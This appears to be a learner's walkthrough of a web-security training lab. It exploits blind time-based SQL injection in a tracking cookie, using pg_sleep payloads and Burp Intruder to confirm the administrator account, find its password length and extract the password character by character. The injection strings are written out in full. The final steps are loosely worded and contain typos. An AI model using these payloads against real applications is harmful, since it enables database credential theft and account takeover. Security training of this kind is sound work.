# Lab 12: Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is 
executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

### **Hint**

You can find some useful payloads on our SQL injection cheat sheet. 

### **Solution**

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
                    
2. Modify the `TrackingId` cookie, changing it to:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Verify that the application takes 10 seconds to respond.

If a regular query is not working, try using URL encoding and ensure that all encoding formats are correct.

`pg_sleep():` allows you to create a delay (sleep) in your queries.

                        
3. Now change it to:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.

`CAST` is a function used to **convert a value from one data type to another**.
                        
4. Now change it 

```sql
to:TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Verify that the condition is true, confirming that there is a user called `administrator`.
                        
5. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

This condition should be true, confirming that the password is greater than 1 character in length.
                        
6. Send a series of follow-up values to test different password lengths. Send:             

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Then send:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

```

And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), **you have determined the length of the password, which is in fact 20 characters long.**
                        
7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to 
use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
                    
8. In Burp Intruder, change the value of the cookie to:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

```

This uses the `SUBSTRING()` function to extract a single character from the password, and test it 
against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
                        
9. Place payload position markers around the `a` character in the cookie value. To do this, select just the `a`, and click the **Add §** button. You should then see the following as the cookie value (note the payload position markers):

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

10. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. In the **Payloads** side panel, check that **Simple list** is selected, and under **Payload configuration** add the payloads in the range a - z and 0 - 9. You can select these easily using the **Add from list** drop-down.
                    
11. To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as 
possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, click the  **Resource pool** tab to open the **Resource pool** side panel and add the attack to a resource pool with the **Maximum concurrent requests** set to `1`.
                    
12. Launch the attack by clicking the  **Start attack** button.
                    
13. Review the attack results to find the value of the character at the first position. You should see a column in the results called **Response received**. This will generally contain a small number,  the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.
                    
14. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window and change the 
specified offset from 1 to 2. You should then see the following as the cookie value:

```sql
TrackingId=wVxtIaqvX6EtBRao'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Now we changed the attack type in to cluster mode and seted the payloads.

first we selected the positon paylod `SUBSTRING(password,§1§,1)` and the character pay load `='§a§')`. 

1. after attackt we selected the all 10,000 milisecond about responce and filter out the password.

### **Community solutions**

> [https://youtu.be/xHzH00vyVHA](https://youtu.be/xHzH00vyVHA)
>